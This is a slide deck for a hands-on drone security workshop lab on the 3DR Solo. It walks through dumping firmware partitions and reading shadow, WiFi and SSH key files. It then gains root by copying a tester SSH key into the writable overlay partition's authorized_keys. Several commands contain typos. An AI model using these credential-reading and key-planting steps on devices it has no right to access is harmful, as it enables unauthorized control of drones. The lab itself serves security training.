@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 04 – Lab: UAV Firmware Analysis</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/dist/reset.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/dist/reveal.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/dist/theme/black.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/plugin/highlight/monokai.css">
+    <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap');
+    :root {
+        --dw-bg: #080808; --dw-panel: #111111; --dw-border: #1a1a1a;
+        --dw-green: #68E01A; --dw-green-glow: rgba(104,224,26,0.1); --dw-green-border: rgba(104,224,26,0.3);
+        --dw-white: #f0f0f0; --dw-gray: #7a8290;
+        --r-background-color: #080808; --r-main-color: #f0f0f0; --r-heading-color: #ffffff;
+        --r-link-color: #68E01A; --r-main-font: 'Inter', system-ui, sans-serif;
+        --r-heading-font: 'Inter', system-ui, sans-serif; --r-code-font: 'JetBrains Mono','Courier New',monospace;
+        --r-main-font-size: 26px;
+    }
+    .reveal-viewport { background: var(--dw-bg); }
+    .reveal .slides { text-align: left; }
+    .reveal h1, .reveal h2, .reveal h3 { text-transform: none; font-weight: 700; }
+    .reveal h1 { color: var(--dw-green); font-size: 1.9em; letter-spacing: -1px; }
+    .reveal h2 { color: var(--dw-white); border-bottom: 2px solid var(--dw-green); padding-bottom: 10px; margin-bottom: 22px; font-size: 1.15em; }
+    .reveal h3 { color: var(--dw-green); font-size: 0.9em; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 12px; }
+    .reveal a { color: var(--dw-green); }
+    .reveal p, .reveal li { line-height: 1.55; }
+    .reveal ul li { margin-bottom: 8px; }
+    .reveal ul li::marker { color: var(--dw-green); }
+    .reveal .progress span { background: var(--dw-green); }
+    .reveal .controls { color: var(--dw-green); }
+    .reveal .slide-number { color: var(--dw-green); background: rgba(0,0,0,0.7); font-family: var(--r-code-font); font-size: 0.52em; padding: 4px 10px; border-radius: 4px; }
+    .reveal .slides > section { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='56' height='97' viewBox='0 0 56 97'%3E%3Cpath fill='none' stroke='%23161616' stroke-width='1' d='M28 0l28 16.3v32.7L28 65.3 0 49V16.3zM28 32l28 16.3v32.7L28 97 0 80.7V48z'/%3E%3C/svg%3E"); background-size: 56px 97px; }
+    .tag { display: inline-block; padding: 3px 12px; border-radius: 20px; font-size: 0.6em; font-weight: 700; letter-spacing: 1px; text-transform: uppercase; margin-right: 6px; }
+    .tag-presentation { border: 1px solid var(--dw-green); color: var(--dw-green); background: var(--dw-green-glow); }
+    .tag-lab { border: 1px solid #60a5fa; color: #93c5fd; background: rgba(96,165,250,0.1); }
+    .tag-activity { border: 1px solid #a78bfa; color: #c4b5fd; background: rgba(167,139,250,0.1); }
+    .objective-box { background: var(--dw-green-glow); border-left: 3px solid var(--dw-green); padding: 12px 18px; border-radius: 0 6px 6px 0; margin: 8px 0; }
+    .warning-box { background: rgba(239,68,68,0.08); border-left: 3px solid #ef4444; padding: 12px 18px; border-radius: 0 6px 6px 0; margin: 8px 0; }
+    .phase-box { background: var(--dw-green-glow); border-left: 3px solid var(--dw-green); padding: 10px 16px; border-radius: 0 6px 6px 0; margin: 8px 0; font-weight: 600; color: var(--dw-green); }
+    .terminal { background: #050505; border: 1px solid var(--dw-border); border-top: 2px solid var(--dw-green); border-radius: 0 0 8px 8px; padding: 16px; font-family: var(--r-code-font); font-size: 0.94em; line-height: 1.7; color: var(--dw-green); white-space: pre; overflow-x: auto; }
+    .terminal::before { content: '\25CF \25CF \25CF'; display: block; color: #252525; margin-bottom: 10px; letter-spacing: 5px; font-size: 0.9em; }
+    .reveal pre { margin: 0; box-shadow: none; }
+    .reveal pre code { background: #050505 !important; color: var(--dw-green) !important; border: 1px solid var(--dw-border); border-radius: 6px; padding: 14px; font-size: 0.94em; }
+    .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 28px; align-items: start; }
+    .reveal table { border-collapse: collapse; width: 100%; font-size: 0.72em; }
+    .reveal table th { background: var(--dw-green-glow); color: var(--dw-green); border: 1px solid var(--dw-green-border); padding: 8px 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; font-size: 0.82em; }
+    .reveal table td { border: 1px solid var(--dw-border); padding: 8px 12px; color: var(--dw-white); vertical-align: top; }
+    .reveal table tr:nth-child(even) td { background: rgba(255,255,255,0.02); }
+    .highlight-green { color: var(--dw-green); font-weight: 600; }
+    .highlight-red { color: #f87171; font-weight: 600; }
+    .highlight-yellow { color: #fbbf24; font-weight: 600; }
+    .highlight-blue { color: #60a5fa; font-weight: 600; }
+    .reveal strong, .reveal b { color: var(--dw-green); }
+    .reveal :not(pre) > code { color: var(--dw-green); }
+    </style>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+
+<section data-background-gradient="radial-gradient(circle at 20% 50%, #060606 0%, #080808 60%)">
+    <div style="text-align:center; padding-top: 40px;">
+        <p><span class="tag tag-lab">LAB</span><span style="color:var(--dw-gray); font-size:0.7em;">60 minutes</span></p>
+        <h1 style="font-size:2em; margin-top: 16px;">Lab: UAV Firmware Analysis</h1>
+        <h3 style="color:var(--dw-gray); font-weight:300; margin-top: 8px;">Module 04</h3>
+        <hr style="border-color: var(--dw-green-border); margin: 24px auto; width: 60%;">
+        <p style="color:var(--dw-green); font-size:0.9em;">Day 1 – UAV & Drone</p>
+        <p style="color:var(--dw-gray); font-size:0.7em; margin-top: 40px;">Hack Our Drone Workshop &mdash; Dark Wolf Solutions</p>
+    </div>
+</section>
+
+<section>
+    <h2>Objectives</h2>
+    <div class="objective-box">Obtain UAV firmware from public sources</div>
+    <div class="objective-box">Analyze firmware with Binwalk</div>
+    <div class="objective-box">Extract and explore the embedded filesystem</div>
+    <div class="objective-box">Identify potential security issues in the extracted content</div>
+</section>
+
+<section>
+    <h2>Background</h2>
+    <p>UAV firmware contains the operating system, configuration files, startup scripts, and binaries that run on the drone's companion computer or flight controller. Analyzing firmware reveals:</p>
+<ul>
+<li>
+<p>Default credentials (hardcoded passwords, SSH keys)</p>
+</li>
+<li>
+<p>Network configuration (open ports, services, firewall rules)</p>
+</li>
+<li>
+<p>Encryption keys or certificates</p>
+</li>
+<li>
+<p>Proprietary communication protocols</p>
+</li>
+<li>
+<p>Debug artifacts left by developers</p>
+</li>
+</ul>
+</section>
+
+<section>
+    <h2>Key tools</h2>
+    <ul>
+<li>
+<p><strong>Binwalk</strong> – firmware analysis and extraction</p>
+</li>
+<li>
+<p><strong>FAT (Firmware Analysis Toolkit)</strong> – automated emulation and analysis</p>
+</li>
+<li>
+<p>Standard Linux tools: <code>file</code>, <code>strings</code>, <code>grep</code>, <code>find</code>, <code>cat</code></p>
+</li>
+</ul>
+</section>
+
+<section>
+    <h2>Phase 1: Obtain Firmware</h2>
+    <h3>Option A – Download from Manufacturer</h3>
+<pre><code class="language-bash"># 3DR Solo firmware is available from the OpenSolo GitHub project
+# ArduCopter firmware releases are on firmware.ardupilot.org
+
+# Check the FCC ID for hardware certification docs with firmware links
+# FCC ID for 3DR Solo: 2AC3P-800
+# https://fccid.io/2AC3P-800
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 1: Obtain Firmware</h2>
+    <h3>Option B – Extract from a Running Device</h3>
+<pre><code class="language-bash"># Connect to 3DR Solo WiFi: SoloLink_XXXXXXXX
+# SSH to the Solo companion computer
+ssh root@10.1.1.10
+
+# View partitions
+cat /proc/mtd
+lsblk
+
+# Dump a partition (example: root filesystem)
+dd if=/dev/mmcblk0p2 | gzip &gt; solo-rootfs.img.gz
+
+# Transfer to your laptop
+# On your laptop:
+scp root@10.1.1.10:/tmp/solo-rootfs.img.gz .
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 1: Obtain Firmware</h2>
+    <h3>Option C – Extract from SD Card</h3>
+<ul>
+<li>
+<p>Remove microSD card from 3DR Solo UAV</p>
+</li>
+<li>
+<p>Mount partition</p>
+</li>
+<li>
+<p>Dump contents</p>
+</li>
+</ul>
+</section>
+
+<section>
+    <h2>Phase 2: Going with Option C</h2>
+    <ul>
+<li>
+<p>Pull SD card for the 3D solo UAV</p>
+</li>
+<li>
+<p>Insert the MicroSD card into the provided Gigastone USB thumbdrive</p>
+</li>
+<li>
+<p>If a format dialog pops up in Wndows <em>DO NOT FORMAT</em> just hit <em>CANCEL</em>
+<img src="../img/dont_format.png" style="width: 80%; height: auto;" align="center"></p>
+</li>
+</ul>
+</section>
+
+<section>
+    <h2>Kali USB passthrough</h2>
+    <p>In VirtualBox you need to confgure the USB passtrough to be able to see the SD card in your Kali Linux.</p>
+<ul>
+<li>Find the devices menu in VirtualBox and click on <code>Generic USB2.0 Device</code></li>
+</ul>
+<p><img src="../img/passthrough.png" style="width: 80%; height: auto;" align="center"></p>
+</section>
+
+<section>
+    <h2>Find MicroSD file partitions</h2>
+    <ul>
+<li>In Kali, open a terminal, type the following command: </li>
+</ul>
+<pre><code class="language-bash">fdisk -l 
+</code></pre>
+<p>We see a 32gb file system on /dev/sdb</p>
+<p>Two of the partitions (sdb3 and sdb4) are Linux partitions</p>
+<p><img src="../img/fdisk.png" style="width: 80%; height: auto;" align="center"></p>
+</section>
+
+<section>
+    <h2>Create mount point</h2>
+    <ul>
+<li>Create a mount point for the sdb3 partition using the following command</li>
+</ul>
+<pre><code class="language-bash">sudo mkdir -p /mnt/solo/p3
+</code></pre>
+<p>Creates a mount point to attach the /dev/sdb partition</p>
+</section>
+
+<section>
+    <h2>Mount partition</h2>
+    <ul>
+<li>Mount the sdb3 partition as a “Read Only” file system</li>
+</ul>
+<pre><code class="language-bash">sudo mount -o ro /dev/sdb3 /mnt/solo/p3
+</code></pre>
+<p>Mounts the microSD partition 3 as ‘read only’ to /mnt/solo/p3</p>
+</section>
+
+<section>
+    <h2>List out files</h2>
+    <ul>
+<li>Find out what files and directories are in this partition</li>
+</ul>
+<pre><code class="language-bash">ls /mnt/solo/p3
+</code></pre>
+<p><img src="../img/listfiles.png" style="width: 80%; height: auto;" align="center"></p>
+<p>We see some of the files we expect on a linux root filesystem, but not all.</p>
+<h3>Why only some?</h3>
+</section>
+
+<section>
+    <h2>Phase 4: Hunt for Sensitive Data (1/3)</h2>
+    <h3>Check for Default Credentials</h3>
+<pre><code class="language-bash"># Shadow file — password hashes
+cat /mnt/solo/etc/shadow
+
+# Passwd file — user accounts
+cat /mnt/solo/etc/passwd
+
+# Look for hardcoded passwords in scripts
+grep -r &quot;password&quot; /mnt/solo/etc/ --include=&quot;*.conf&quot; --include=&quot;*.sh&quot;
+grep -r &quot;passwd&quot; /mnt/solo/usr/share/ -l
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 4: Hunt for Sensitive Data (2/3)</h2>
+    <h3>Check for Wifi Creds</h3>
+<ul>
+<li>List the files in the Solo’s /etc directory</li>
+</ul>
+<pre><code class="language-bash">ls /mnt/solo/p3/etc
+</code></pre>
+<p>-Dump the contents of the <code>wpa_supplicant.conf</code> file</p>
+<pre><code class="language-bash">cat /etc/solo/p3/wpasupplicant.conf
+</code></pre>
+<p>Lists the SSID and PSK (password) of the wifi connection</p>
+<h3>Check for SSH Keys</h3>
+<pre><code class="language-bash">find /mnt/solo/p3 -name &quot;*.pem&quot; -o -name &quot;*.key&quot; -o -name &quot;id_rsa&quot; 2&gt;/dev/null
+cat /mnt/solo/p3/etc/ssh/sshd_config
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 4: Hunt for Sensitive Data (3/3)</h2>
+    <h3>Check Network Services</h3>
+<pre><code class="language-bash">cat /mnt/solo/p3/etc/inetd.conf 2&gt;/dev/null
+find /mnt/solo/p3 -name &quot;*.service&quot; | xargs grep -l &quot;Listen\|Port&quot; 2&gt;/dev/null
+cat /mnt/solo/p3/etc/init.d/* | grep -i &quot;start&quot;
+</code></pre>
+<h3>Check for Development Artifacts</h3>
+<pre><code class="language-bash">find /mnt/solo/p3 -name &quot;*.log&quot; -o -name &quot;debug*&quot; 2&gt;/dev/null
+grep -r &quot;TODO\|FIXME\|HACK\|debug&quot; /mnt/solo/etc/ 2&gt;/dev/null
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 5: Analyze Startup and Services</h2>
+    <pre><code class="language-bash"># What runs at boot?
+cat /mnt/solo/p3/etc/inittab 2&gt;/dev/null
+ls /mnt/solo/p3/etc/init.d/
+cat /mnt/solo/p3/etc/rc.local 2&gt;/dev/null
+
+# What network services are configured?
+cat /mnt/solo/p3/etc/hostapd.conf 2&gt;/dev/null  # WiFi AP configuration
+cat /mnt/solo/p3/etc/wpa_supplicant.conf 2&gt;/dev/null
+cat /mnt/solo/p3/etc/network/interfaces 2&gt;/dev/null
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 6: Root Authentication Bypass</h2>
+    <h3>Examine the mounted files systems on the 3DR Solo</h3>
+<p>Run this command to examine the mounted filesystems on the 3DR Solo</p>
+<pre><code class="language-bash">ssh root@10.1.1.10 &quot;mount | grep mmc&quot;
+</code></pre>
+<p>The output should resemble the following</p>
+<pre><code class="language-bash">/dev/mmcblk0p2 on /mnt/boot type vfat (ro,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=iso8859-1,shortname=mixed,errors=remount-ro)
+/dev/mmcblk0p3 on /mnt/rootfs.rw type ext3 (rw,relatime,errors=continue,user_xattr,acl,barrier=1,data=ordered)
+/dev/mmcblk0p4 on /log type ext4 (rw,relatime,data=ordered)
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 6: Root Authentication Bypass</h2>
+    <h3>Overlay File Systems</h3>
+<p>Note that partition 2 <code>/dev/mmc0blk2</code> is mounted <code>read only</code> as indicated by the <code>ro</code> flag.</p>
+<p>Note that partition 3 <code>/dev/mmc0blk3</code> is mounted <code>read write</code> as indicated by the <code>rw</code> flag</p>
+<p>This is because parition 3 is an <code>overlay</code> partition that allows for persistant modification of the underlying <code>read only</code> file system. Because it is <code>read and write</code>, files that we add to partition 3 will be included as part of the root filesystem during bootup.</p>
+</section>
+
+<section>
+    <h2>Phase 6: Root Authentication Bypass</h2>
+    <h3>Mount the 3DR microSD card on your Kali VM</h3>
+<ul>
+<li>
+<p>Turn the 3DR UAV off.</p>
+</li>
+<li>
+<p>Remove the microSD card</p>
+</li>
+<li>
+<p>Insert the microSD card in the gigastone USB microSD card adapter</p>
+</li>
+<li>
+<p>Insert the Gigastone adapter in the laptop</p>
+</li>
+<li>
+<p>Configure USB passthrough to the Kali VM</p>
+</li>
+</ul>
+<pre><code class="language-bash"># verify the microSD card is available 
+# in the Kali VM this will likely be on /dev/sdb
+sudo fdisk -l
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 6: Root Authentication Bypass</h2>
+    <h3>3DR Solo MicroSD Card Partitions</h3>
+<p>The output should resemble the following</p>
+<pre><code class="language-bash">Disk /dev/sdb: 7.44 GiB, 7988051968 bytes, 15601664 sectors
+Disk model: Mass-Storage    
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disklabel type: dos
+Disk identifier: 0x0000e230
+
+Device     Boot  Start      End  Sectors  Size Id Type
+/dev/sdb1         8192   188415   180224   88M  c W95 FAT32 (LBA)
+/dev/sdb2       194560   391167   196608   96M  c W95 FAT32 (LBA)
+/dev/sdb3       391168   585727   194560   95M 83 Linux
+/dev/sdb4       585728 15521791 14936064  7.1G 83 Linux
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 6: Root Authentication Bypass</h2>
+    <h3>Mount Partition 3</h3>
+<p>Mount the RW partition so that you can modify it</p>
+<pre><code class="language-bash">mkdir -p /mnt/solo/p3
+mount /dev/sdb3 /mnt/solo/p3
+ls -l /mnt/solo/p3
+</code></pre>
+<p>Your output should resemble the following</p>
+<pre><code class="language-bash">total 21
+drwxr-xr-x 4 root root  1024 Feb 13  2022 etc
+drwxr-xr-x 3 root root  1024 Jan 26  2020 firmware
+drwxr-sr-x 3 root root  1024 Feb 13  2022 home
+drwx------ 2 root root 12288 Dec 31  1969 lost+found
+drwxr-xr-x 2 root root  1024 Dec 31  1969 media
+drwxr-xr-x 5 root root  1024 Dec 31  1969 mnt
+-rw-r--r-- 1 root root    33 Feb 13  2022 PIX_VERSION
+drwxr-xr-x 3 root root  1024 Dec 31  1969 run
+lrwxrwxrwx 1 root root     8 Dec 31  1969 tmp -&gt; /var/tmp
+drwxr-xr-x 4 root root  1024 Jan 26  2020 usr
+drwxr-xr-x 3 root root  1024 Dec 31  1969 var
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 6: Root Authentication Bypass</h2>
+    <h3>Create a new set of SSH Keys for tester</h3>
+<p>The following instructions will add tester controlled ssh keys to the 3DR to allow for passwordless login.</p>
+<pre><code class="language-bash"># generate a SSH keypair
+ssh-keygen -f tester
+</code></pre>
+<p>Insert tester SSH key into 3DR root filesystem</p>
+<pre><code class="language-bash">sudo cp tester.pub /mnt/solo/p3/home/root/.ssh/authorized_keys
+sudo chmod 0600 /mnt/solo/p3/home/root/authorized_keys
+sudo chown -R root:root /mnt/solo/p3/home/root/.ssh
+umount /mnt/solo/p3
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 6: Root Authentication Bypass</h2>
+    <h3>Reboot the 3DR Solo</h3>
+<ul>
+<li>
+<p>Remove the Gigastone adapter from the 3DR UAV</p>
+</li>
+<li>
+<p>Remove the microSD card from the Gigastone</p>
+</li>
+<li>
+<p>Insert the microSD card into the 3DR Solo UAV</p>
+</li>
+<li>
+<p>Power on the Controller, if not already powered on</p>
+</li>
+<li>
+<p>Power on the 3DR Solo</p>
+</li>
+<li>
+<p>On your laptop, join the wifi for your 3DR</p>
+</li>
+</ul>
+</section>
+
+<section>
+    <h2>Phase 6: Root Authentication Bypass</h2>
+    <p>Login to the 3DR Solo with the injected SSH Keys</p>
+<pre><code class="language-bash">ssh1 -i tester root@10.1.1.10
+</code></pre>
+<h3>Congratulations on your Authentication Bypass Attack</h3>
+</section>
+
+<section>
+    <h2>Expected Findings: 3DR Solo</h2>
+    <table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Location</th>
+<th>Severity</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SSH root access enabled</td>
+<td>/etc/ssh/sshd_config</td>
+<td>High</td>
+</tr>
+<tr>
+<td>WiFi passphrase in config</td>
+<td>/etc/wpa_supplicant.conf</td>
+<td>High</td>
+</tr>
+<tr>
+<td>Telnet service enabled</td>
+<td>/etc/inetd.conf</td>
+<td>High</td>
+</tr>
+<tr>
+<td>No firewall configuration</td>
+<td>(absent)</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>Build artifacts / debug logs</td>
+<td>/var/log/, /tmp/</td>
+<td>Low</td>
+</tr>
+</tbody>
+</table>
+</section>
+
+<section>
+    <h2>Cleanup</h2>
+    <p>Once you have found all the content you need unmounnt the microsd card with the following command: </p>
+<pre><code class="language-bash">sudo umount /mnt/solo/pe3
+</code></pre>
+</section>
+
+<section>
+    <h2>Discussion Questions</h2>
+    <ol>
+<li>
+<p>What is the impact of a compromised root password on this drone?</p>
+</li>
+<li>
+<p>If the WiFi passphrase is embedded in firmware, what does that mean for all 3DR Solo drones using the same firmware version?</p>
+</li>
+<li>
+<p>How would you responsibly disclose a firmware vulnerability to a manufacturer?</p>
+</li>
+<li>
+<p>What security controls would you add to this firmware?</p>
+</li>
+</ol>
+</section>
+</div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/dist/reveal.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/plugin/highlight/highlight.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/plugin/notes/notes.js"></script>
+<script>
+Reveal.initialize({
+    hash: true,
+    slideNumber: 'c/t',
+    transition: 'fade',
+    transitionSpeed: 'fast',
+    backgroundTransition: 'none',
+    mouseWheel: true,
+    plugins: [RevealHighlight, RevealNotes]
+});
+</script>
+</body>
+</html>
